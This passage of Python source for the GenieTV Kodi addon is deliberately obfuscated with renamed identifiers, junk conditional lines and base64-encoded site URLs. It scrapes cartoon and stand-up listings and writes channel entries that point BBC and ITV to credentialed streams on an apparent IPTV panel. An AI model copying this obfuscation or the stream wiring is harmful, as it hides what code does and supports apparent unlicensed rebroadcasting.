  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , Ii1I )
  if 8 - 8: I1I1ii / i11i1 . OOOo0 + ii11ii1ii / i11iIiiIii
  if 31 - 31: oOO - iIii1I11I1II1 + II1i1IiiIIi11 . Oo / iI1Ii11iII1 % iIii1I11I1II1
  if 6 - 6: iI1Ii11iII1 * i11iIiiIii % iIii1I11I1II1 % i11iIiiIii + OOooOOo / i1IIi
  if 53 - 53: OOoo0OO0 + iIii1I11I1II1
  if 70 - 70: ii11ii1ii
def oo0O ( ) :
 if 6 - 6: Oo . iI1Ii11iII1 / iI1Ii11iII1 - i11iIiiIii
 iIiIIIi ( '[COLORgreen]Cartoons[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) , 10004 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Search Cartoons[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if 87 - 87: Oo / O0 * iI1Ii11iII1 / OOooOOo
def I1iiIII ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) )
 IiI11iII1 = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if iiI11iI in oO00oooOOoOo0 . lower ( ) :
   if 'Dad!' in oO00oooOOoOo0 :
    pass
   elif 'Family Guy' in oO00oooOOoOo0 :
    pass
   elif '2 Stupid' in oO00oooOOoOo0 :
    pass
   elif 'The Zelfs' in oO00oooOOoOo0 :
    pass
   elif 'A Clone' in oO00oooOOoOo0 :
    pass
   elif 'A.T.O.M' in oO00oooOOoOo0 :
    pass
   elif 'Almost Naked' in oO00oooOOoOo0 :
    pass
   elif 'Angry Kid' in oO00oooOOoOo0 :
    pass
   elif 'Annoying Orange' in oO00oooOOoOo0 :
    pass
   elif 'Aqua Teen' in oO00oooOOoOo0 :
    pass
   elif 'Assy Mcgee' in oO00oooOOoOo0 :
    pass
   elif 'Astroblast' in oO00oooOOoOo0 :
    pass
   elif 'Atomic Betty' in oO00oooOOoOo0 :
    pass
   elif 'Axe Cop' in oO00oooOOoOo0 :
    pass
   elif 'Baby Playpen' in oO00oooOOoOo0 :
    pass
   elif 'Beavis and Butt' in oO00oooOOoOo0 :
    pass
   elif 'Celebrity Deathmatch' in oO00oooOOoOo0 :
    pass
   elif 'Clerks The' in oO00oooOOoOo0 :
    pass
   elif 'Crapston Villas' in oO00oooOOoOo0 :
    pass
   elif 'Duckman:' in oO00oooOOoOo0 :
    pass
   elif 'Stripperella' in oO00oooOOoOo0 :
    pass
   elif 'Vixen' in oO00oooOOoOo0 :
    pass
   else :
    iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 16 - 16: Ooo0OO0oOO + oOO / OOooOOo
def O00oOoo0OoO0 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  if 'Dad!' in oO00oooOOoOo0 :
   pass
  elif 'Family Guy' in oO00oooOOoOo0 :
   pass
  elif '2 Stupid' in oO00oooOOoOo0 :
   pass
  elif 'The Zelfs' in oO00oooOOoOo0 :
   pass
  elif 'A Clone' in oO00oooOOoOo0 :
   pass
  elif 'A.T.O.M' in oO00oooOOoOo0 :
   pass
  elif 'Almost Naked' in oO00oooOOoOo0 :
   pass
  elif 'Angry Kid' in oO00oooOOoOo0 :
   pass
  elif 'Annoying Orange' in oO00oooOOoOo0 :
   pass
  elif 'Aqua Teen' in oO00oooOOoOo0 :
   pass
  elif 'Assy Mcgee' in oO00oooOOoOo0 :
   pass
  elif 'Astroblast' in oO00oooOOoOo0 :
   pass
  elif 'Atomic Betty' in oO00oooOOoOo0 :
   pass
  elif 'Axe Cop' in oO00oooOOoOo0 :
   pass
  elif 'Baby Playpen' in oO00oooOOoOo0 :
   pass
  elif 'Beavis and Butt' in oO00oooOOoOo0 :
   pass
  elif 'Celebrity Deathmatch' in oO00oooOOoOo0 :
   pass
  elif 'Clerks The' in oO00oooOOoOo0 :
   pass
  elif 'Crapston Villas' in oO00oooOOoOo0 :
   pass
  elif 'Duckman:' in oO00oooOOoOo0 :
   pass
  elif 'Stripperella' in oO00oooOOoOo0 :
   pass
  elif 'Vixen' in oO00oooOOoOo0 :
   pass
  else :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 62 - 62: i1IIi / oOO . OOOo0 * OOooOOo
def i11i1Ii1 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IIII11I1I = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( IIi1IIIi )
 for IIIIiI11I11 in IIII11I1I :
  o0oO0oo0000OO = IIIIiI11I11
 I1i1ii1IiIii = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( IIi1IIIi )
 for url in I1i1ii1IiIii :
  iIiIIIi ( '[COLORgreen]NEXT PAGE[/COLOR]' , url , 10006 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 IiI11iII1 = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 10007 , o0oO0oo0000OO )
  if 69 - 69: I1IiI % Ooo0OO0oOO - OOoo0OO0
  if 38 - 38: iIii1I11I1II1 + i11iIiiIii / i11iIiiIii % Ooo00oOo00o / oOO % oO0O
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 7 - 7: iI1Ii11iII1 * OOOo0 + i1IIi + i11iIiiIii + Oo % OOOo0
def OO00OO0o0 ( url , IMAGE ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , url in IiI11iII1 :
  print oO00oooOOoOo0 + '     ' + url
  if 'easy' in url :
   oOOOooOo0O ( url )
   if 43 - 43: OOooOOo . II1i1IiiIIi11 . OOoo0OO0 + iIii1I11I1II1
   if 78 - 78: iIii1I11I1II1 % I1IiI + ii11ii1ii / i1IIi % OoOoOO00 + i11i1
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 91 - 91: iIii1I11I1II1 % Ooo00oOo00o . OOooOOo + oO0O + OOooOOo
def oOOOooOo0O ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( "url: '(.+?)'," ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  o00OOo ( url )
  if 87 - 87: Ooo00oOo00o % OOOo0
  if 77 - 77: iIii1I11I1II1 - i1IIi . Ooo0OO0oOO
  if 26 - 26: OOooOOo * iI1Ii11iII1 . i1IIi
def ooOoOO ( ) :
 if 56 - 56: iIii1I11I1II1 . i11iIiiIii - i11i1 * OoOoOO00 * I1I1ii
 iIiIIIi ( '[COLORgreen]Stand Up[/COLOR]' , '' , 10014 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Search Comedian[/COLOR]' , '' , 10015 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Others[/COLOR]' , '' , 10017 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if 5 - 5: i11i1 / i11i1 - ii11ii1ii
def oO0ooOO ( ) :
 Oo0oO00o = I1ii1Ii1 ( ( i1111 ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC9zdGFuZHVwbGlzdC5waHA=' ) ) )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  if 'elete' in oO00oooOOoOo0 :
   pass
  else :
   I1i1iii1Ii ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 222 , IIIIiI11I11 )
   if 7 - 7: OoOoOO00 - i11i1 . OoOoOO00
def OOo0O0O000 ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 Oo0oO00o = I1ii1Ii1 ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 II1Ii = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , OOoO00ooO , iIiiiI1IiI1I1 in II1Ii :
  for iiI11iI in OOoO00ooO :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< img >>>>>>>>>>>>>>>>>>>>>>>>>>'
   I1IIIIiii1i = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
   for ooooO0oOoOOoO , oO00oooOOoOo0 in I1IIIIiii1i :
    if 'tube' in ooooO0oOoOOoO :
     pass
    elif 'stage' in ooooO0oOoOOoO :
     I1i1iii1Ii ( '[COLORgreen]' + OOoO00ooO + '   -   ' + oO00oooOOoOo0 + '[/COLOR]' , ( ooooO0oOoOOoO ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + IIIIiI11I11 , )
    elif 'vee' in ooooO0oOoOOoO :
     pass
     if 51 - 51: i11i1 . OOOo0
def Ooi11III1II1 ( ) :
 Oo0oO00o = I1ii1Ii1 ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 II1Ii = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , OOoO00ooO , iIiiiI1IiI1I1 in II1Ii :
  I1IIIIiii1i = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
  for ooooO0oOoOOoO , oO00oooOOoOo0 in I1IIIIiii1i :
   if 'tube' in ooooO0oOoOOoO :
    pass
   elif 'stage' in ooooO0oOoOOoO :
    I1i1iii1Ii ( '[COLORgreen]' + OOoO00ooO + '   -   ' + oO00oooOOoOo0 + '[/COLOR]' , ( ooooO0oOoOOoO ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + IIIIiI11I11 )
   elif 'vee' in ooooO0oOoOOoO :
    pass
    if 42 - 42: OoOoOO00 * OOOo0 % i1IIi - oO0O % iI1Ii11iII1
    if 36 - 36: i11iIiiIii / Ooo0OO0oOO * ii11ii1ii * ii11ii1ii + oO0O * OOoo0OO0
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 32 - 32: Ooo00oOo00o
def i1iii11 ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 print '>>>>>>>>>>>>>>>>>>>>>>>>' + url + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 OOoOooOoOOOoo = re . compile ( "url\[.+?\] = '(.+?)';" ) . findall ( Oo0oO00o )
 print '>>>>>>>>>>>>>>>>>>>>>>>' + ( str ( OOoOooOoOOOoo ) ) + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 for url in OOoOooOoOOOoo :
  o00OOo ( ( url ) . replace ( '[' , '' ) . replace ( ']' , '' ) . replace ( '\'' , '' ) )
  if 92 - 92: I1IiI . OoooooooOO - I1I1ii
  if 74 - 74: iIii1I11I1II1 % II1i1IiiIIi11 * i11i1 * iIii1I11I1II1
  if 73 - 73: OOooOOo % I1I1ii . i11i1
  if 60 - 60: I1IiI
  if 5 - 5: OOOo0 - OOOo0 - OOOo0 * OoooooooOO
  if 28 - 28: iIii1I11I1II1 + iIii1I11I1II1
  if 28 - 28: Ooo0OO0oOO
def ooo0oo ( ) :
 if 8 - 8: Ooo00oOo00o + I1IiI . iIii1I11I1II1 % O0
 iI11Ii111 ( '[COLOR darkgoldenrod]Open Pandora\'s Box[/COLOR]' , '' , 10029 , 'https://encrypted-tbn1.gstatic.com/images?q=tbn%3AANd9GcTQ9r4TA8yIw9ggxuwsHxWojo6tPVfgTe8QIOxOQwzNR2TavtCi6Q' , i1iiIII111ii , '' )
 iI11Ii111 ( '[COLOR darkgoldenrod]Search[/COLOR]' , '' , 10026 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 54 - 54: I1IiI % II1i1IiiIIi11 . I1IiI * i11i1 + I1IiI % i1IIi
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 23 - 23: I1I1ii - i11i1 + oO0O - I1IiI * I1IiI . Oo
def iIii11iI1II ( ) :
 iI11Ii111 ( 'Search Pandoras Films' , '' , 10027 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 iI11Ii111 ( 'Search Pandoras TV' , '' , 10028 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 42 - 42: oOO - OOOo0 + ii11ii1ii % oO0O
 i1IIIiiII1 ( 'movies' , 'MAIN' )
def IiIi1III ( ) :
 if 47 - 47: OoooooooOO % O0 * II1i1IiiIIi11 . oO0O
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 ii111Iiii = [ 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 54 - 54: OoooooooOO - OOOo0 % ii11ii1ii
 for oO0Ooo0OooOOo in ii111Iiii :
  O00o0O = IIiiiiiiIi1I1 + oO0Ooo0OooOOo + II11iiii1Ii
  Oo0oO00o = I1ii1Ii1 ( O00o0O )
  IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( Oo0oO00o )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , i1i1ii , oO00oooOOoOo0 in IiI11iII1 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    iIIIiI ( oO00oooOOoOo0 , ooooO0oOoOOoO , 222 , OOOO0OOO , i1i1ii , o0OoOO )
    if 93 - 93: oOO . iIii1I11I1II1 % i11iIiiIii . I1IiI % oOO + O0
    i1IIIiiII1 ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 65 - 65: oO0O + Ooo00oOo00o - OoooooooOO
    if 51 - 51: Oo + Ooo0OO0oOO / II1i1IiiIIi11 - i1IIi
def oO0O0oO0 ( ) :
 if 15 - 15: oOO * I1IiI % iI1Ii11iII1 . I1IiI . OOoo0OO0
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 ii111Iiii = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 97 - 97: Ooo0OO0oOO
 for oO0Ooo0OooOOo in ii111Iiii :
  oOoO0O00oo = IIiiiiiiIi1I1 + oO0Ooo0OooOOo + II11iiii1Ii
  Oo0oO00o = I1ii1Ii1 ( oOoO0O00oo )
  IiI11iII1 = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( Oo0oO00o )
  for oO00oooOOoOo0 , o0OoOO , ooooO0oOoOOoO , IIIIiI11I11 , i1i1ii , OOoOoo00Oo in IiI11iII1 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    iI11Ii111 ( oO00oooOOoOo0 , ooooO0oOoOOoO , OOoOoo00Oo , IIIIiI11I11 , i1i1ii , o0OoOO )
    if 9 - 9: OoOoOO00 * OoOoOO00 . i11iIiiIii * iIii1I11I1II1
    i1IIIiiII1 ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 18 - 18: Ooo00oOo00o . OoOoOO00 % I1IiI % oO0O
    if 87 - 87: iIii1I11I1II1 . OoooooooOO * I1IiI
def OOOoo0ooOo00O ( ) :
 if 38 - 38: iIii1I11I1II1 + i11iIiiIii * Ooo00oOo00o * oOO % i11i1
 IIi1IIIi = I1ii1Ii1 ( IIiiiiiiIi1I1 + 'spongemain.php' )
 IiI11iII1 = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , o0OoOO , ooooO0oOoOOoO , IIIIiI11I11 , i1i1ii , OOoOoo00Oo in IiI11iII1 :
  iI11Ii111 ( oO00oooOOoOo0 , ooooO0oOoOOoO , OOoOoo00Oo , IIIIiI11I11 , i1i1ii , o0OoOO )
  i1IIIiiII1 ( 'movies' , 'MAIN' )
def I1I11IiiI ( url ) :
 if 40 - 40: OOoo0OO0 % OoooooooOO - i11i1 + OOooOOo / i11i1
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 ooOiii1 = ( '%s%s' % ( OO0o0oO0O000o , url ) )
 iii1 = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( iii1 )
 for url , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in IiI11iII1 :
  iIIIiI ( oO00oooOOoOo0 , url , 222 , OOOO0OOO , I1iI11iii , o0OoOO )
  if 78 - 78: O0 / OoOoOO00 * Ooo00oOo00o
  i1IIIiiII1 ( 'movies' , 'MAIN' )
  if 50 - 50: OoooooooOO - iIii1I11I1II1 + i1IIi % I1I1ii - iIii1I11I1II1 % O0
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 58 - 58: iI1Ii11iII1 + iIii1I11I1II1
  if 65 - 65: OoOoOO00 - I1I1ii % OOooOOo - I1IiI * II1i1IiiIIi11 + oO0O
def O0o0O0OO0o ( url ) :
 if 54 - 54: I1IiI . Ooo0OO0oOO % i11iIiiIii / OoooooooOO + iI1Ii11iII1 % Ooo0OO0oOO
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , o0OoOO , url , IIIIiI11I11 , i1i1ii , OOoOoo00Oo in IiI11iII1 :
  iI11Ii111 ( oO00oooOOoOo0 , url , OOoOoo00Oo , IIIIiI11I11 , i1i1ii , o0OoOO )
  if 36 - 36: Ooo0OO0oOO
  i1IIIiiII1 ( 'movies' , 'MAIN' )
  if 74 - 74: OoooooooOO
  if 72 - 72: O0 + OOOo0 - II1i1IiiIIi11 - Ooo00oOo00o
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 100 - 100: O0
def iIIIiI ( name , url , mode , iconimage , fanart , description ) :
 if 79 - 79: iIii1I11I1II1
 O00oO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 I1i1iii = True
 IiI1iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 IiI1iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 IiI1iI1 . setProperty ( "Fanart_Image" , fanart )
 I1i1iii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = O00oO0o , listitem = IiI1iI1 , isFolder = False )
 return I1i1iii
 if 23 - 23: II1i1IiiIIi11 + i11i1 * oOO / iIii1I11I1II1 - II1i1IiiIIi11
def iI11Ii111 ( name , url , mode , iconimage , fanart , description ) :
 if 80 - 80: OOOo0 - iIii1I11I1II1 . i11i1 + Ooo00oOo00o - I1I1ii
 O00oO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 I1i1iii = True
 IiI1iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 IiI1iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 IiI1iI1 . setProperty ( "Fanart_Image" , fanart )
 I1i1iii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = O00oO0o , listitem = IiI1iI1 , isFolder = True )
 return I1i1iii
if 5 - 5: II1i1IiiIIi11
if 62 - 62: I1IiI . OoooooooOO . i11i1 . Ooo00oOo00o * II1i1IiiIIi11
if 78 - 78: Ooo0OO0oOO / Ooo00oOo00o - Ooo0OO0oOO * OoooooooOO . I1IiI
if 96 - 96: OOOo0 % i1IIi . OOooOOo . O0
if 37 - 37: i1IIi - i11i1 % OoooooooOO / i11i1 % oOO
if 48 - 48: i11iIiiIii % Ooo0OO0oOO
if 29 - 29: II1i1IiiIIi11 + i11iIiiIii % OOoo0OO0
if 93 - 93: I1IiI % iIii1I11I1II1
if 90 - 90: OOOo0 - i11i1 / oO0O / O0 / OOoo0OO0
if 87 - 87: I1IiI / iI1Ii11iII1 + iIii1I11I1II1
if 93 - 93: iIii1I11I1II1 + Ooo0OO0oOO % oOO
if 21 - 21: i11i1
if 6 - 6: iI1Ii11iII1
if 46 - 46: iI1Ii11iII1 + Ooo0OO0oOO
if 79 - 79: OoooooooOO - iI1Ii11iII1 * iI1Ii11iII1 . I1IiI
def Oo00ooO0OoOo ( string ) :
 if I11iii1Ii == 'true' :
  xbmc . log ( "[addon.live.GenieTV-%s]: %s" % ( addon_version , string ) )
  if 99 - 99: I1IiI
def oO00OoOo ( name , url , iconimage , fanart , mode , playlist = None , regexs = None ) :
 OoOi111i = [ ]
 try :
  if 46 - 46: Ooo00oOo00o * Oo % Ooo0OO0oOO + O0 * iI1Ii11iII1
  name = name . encode ( 'utf-8' , 'ignore' )
 except :
  pass
 if os . path . exists ( o0 ) == False :
  Oo00ooO0OoOo ( 'Making Favorites File' )
  OoOi111i . append ( ( name , url , iconimage , fanart , mode , playlist , regexs ) )
  IiIIIIIi = open ( o0 , "w" )
  IiIIIIIi . write ( json . dumps ( OoOi111i ) )
  IiIIIIIi . close ( )
 else :
  Oo00ooO0OoOo ( 'Appending Favorites' )
  IiIIIIIi = open ( o0 ) . read ( )
  ii1I11i = json . loads ( IiIIIIIi )
  ii1I11i . append ( ( name , url , iconimage , fanart , mode ) )
  oOOo00O0OOOo = open ( o0 , "w" )
  oOOo00O0OOOo . write ( json . dumps ( ii1I11i ) )
  oOOo00O0OOOo . close ( )
  if 89 - 89: I1I1ii . iI1Ii11iII1 % Oo . Oo - OoooooooOO
  if 56 - 56: OOoo0OO0
def IiI1O0oO ( ) :
 IiIII = json . loads ( open ( o0 ) . read ( ) )
 IIiI1111i1 = len ( IiIII )
 for ii1ii1I1IIi1 in IiIII :
  oO00oooOOoOo0 = ii1ii1I1IIi1 [ 0 ]
  ooooO0oOoOOoO = ii1ii1I1IIi1 [ 1 ]
  OOOO0OOO = ii1ii1I1IIi1 [ 2 ]
  try :
   oOOoo0 = ii1ii1I1IIi1 [ 3 ]
   if oOOoo0 == None :
    raise
  except :
   if o0oO0 . getSetting ( 'use_thumb' ) == "true" :
    oOOoo0 = OOOO0OOO
   else :
    oOOoo0 = i1i1ii
  try : IIIIiI11I = ii1ii1I1IIi1 [ 5 ]
  except : IIIIiI11I = None
  try : iiiI11iIIi1 = ii1ii1I1IIi1 [ 6 ]
  except : iiiI11iIIi1 = None
  if 72 - 72: II1i1IiiIIi11 * i11i1
  if ii1ii1I1IIi1 [ 4 ] == 0 :
   iIiIIIi ( oO00oooOOoOo0 , ooooO0oOoOOoO , '' , OOOO0OOO , i1i1ii , '' , 'fav' )
  else :
   iIiIIIi ( oO00oooOOoOo0 , ooooO0oOoOOoO , ii1ii1I1IIi1 [ 4 ] , OOOO0OOO , i1i1ii , '' , 'fav' )
   if 67 - 67: i1IIi
def iii ( name ) :
 ii1I11i = json . loads ( open ( o0 ) . read ( ) )
 for oOOOo in range ( len ( ii1I11i ) ) :
  if ii1I11i [ oOOOo ] [ 0 ] == name :
   del ii1I11i [ oOOOo ]
   oOOo00O0OOOo = open ( o0 , "w" )
   oOOo00O0OOOo . write ( json . dumps ( ii1I11i ) )
   oOOo00O0OOOo . close ( )
   break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
 if 31 - 31: I1IiI + I1IiI . i11iIiiIii / oOO % OOoo0OO0 / I1IiI
 if 29 - 29: ii11ii1ii * ii11ii1ii . Ooo00oOo00o * OOoo0OO0 % iIii1I11I1II1 * ii11ii1ii
def Oo0 ( ) :
 iIiiIIi1iiII = os . path . join ( iIii1 , 'addons.ini' )
 oooO00Oo = open ( iIiiIIi1iiII , "w+" )
 if 86 - 86: OoOoOO00 + oOO + iI1Ii11iII1
 oooO00Oo . write ( r'# This file contains the "built-in" channels' + '\n' )
 oooO00Oo . write ( r'# It is parsed by Pythons ConfigParser' + '\n\n' )
 oooO00Oo . write ( r'[plugin.video.GenieTv]' + '\n' )
 oooO00Oo . write ( r'BBC One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F191.m3u8&mode=10012&name=[COLORgreen]BBC+One%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'BBC Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F190.m3u8&mode=10012&name=[COLORgreen]BBC+Two%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'BBC Four=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F188.m3u8&mode=10012&name=[COLORgreen]BBC+Four%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'ITV=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F208.m3u8&mode=10012&name=[COLORgreen]ITV1%0D[%2FCOLOR]' + '\n' )
